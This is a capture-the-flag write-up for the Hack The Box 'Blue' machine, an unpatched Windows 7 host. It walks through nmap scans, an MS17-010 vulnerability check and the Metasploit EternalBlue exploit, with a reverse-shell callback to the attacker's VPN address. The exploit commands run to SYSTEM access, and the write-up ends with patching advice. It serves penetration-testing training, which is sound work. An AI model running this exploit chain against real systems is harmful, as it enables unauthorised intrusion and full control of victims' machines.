# HTB — Blue

> **OS:** Windows · **Difficulty:** Easy · **Status:** Rooted
> **Themes:** SMB enumeration → MS17-010 (EternalBlue) → direct remote kernel exploit → SYSTEM

---

## 1. Recon

```bash
sudo nmap -p- --min-rate 1000 -sV <target>
```

| Port | Service | Notes |
|------|---------|-------|
| 135/139/445 | SMB / RPC | **Windows 7**, host HARIS-PC, WORKGROUP |
| 49152+ | msrpc | dynamic RPC |

Windows 7 + SMB exposed → immediately suspect **EternalBlue (MS17-010)**.

## 2. Verify before exploiting (golden rule)

Never fire EternalBlue blind — a failed attempt can **BSOD** the target (kernel memory corruption). Confirm first with an NSE vuln check:

```bash
# don't know the script name? run them all:
sudo nmap -p445 --script "smb-vuln*" <target>
# specific check:
sudo nmap -p445 --script smb-vuln-ms17-010 <target>
```
Result: `smb-vuln-ms17-010: State: VULNERABLE` (CVE-2017-0143).

**Lesson:** `--script "smb-vuln*"` runs every SMB vuln check; only the applicable ones report `VULNERABLE` — the scan tells you which CVE applies, you don't pre-guess. Many NSE scripts need `sudo` (raw sockets).

## 3. Exploit — Metasploit EternalBlue

> OSCP note: Metasploit allowed on only one exam box. Manual path = AutoBlue (`42031.py`). Here MSF is used for reliability.

```
msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>          # R = Remote = the victim
set LHOST tun0               # L = Local = YOU (VPN IP, not the auto-detected LAN IP!)
set LPORT 4444               # your callback port
show options                 # verify RHOSTS + LHOST
exploit
```

Critical gotchas:
- **LHOST must be your `tun0` VPN IP**, not the auto-filled LAN IP — else the reverse shell never arrives.
- **L = you, R = target.** LHOST/LPORT = your IP/port; RHOSTS = the victim.
- EternalBlue is flaky; if "exploit completed but no session created", **re-run** — often lands on the 2nd/3rd try.

Success → `WIN` → `Meterpreter session 1 opened`.

## 4. Loot

```
getuid                       # NT AUTHORITY\SYSTEM (no privesc needed)
search -f user.txt
search -f root.txt
cat "c:\\Users\\haris\\Desktop\\user.txt"
cat "c:\\Users\\Administrator\\Desktop\\root.txt"
```
EternalBlue runs in the kernel → you land as **SYSTEM** directly; both flags readable.

## 5. Remediation (for the report)
- Apply MS17-010 patch; this is a critical, wormable RCE (WannaCry/NotPetya vector).
- Disable **SMBv1** entirely.
- Segment and firewall SMB (445) from untrusted networks.

## 6. Kill chain
`nmap → SMB 445 (Win7) → nmap --script smb-vuln* = ms17-010 VULNERABLE → MSF ms17_010_eternalblue (LHOST tun0) → Meterpreter as SYSTEM → user + root`
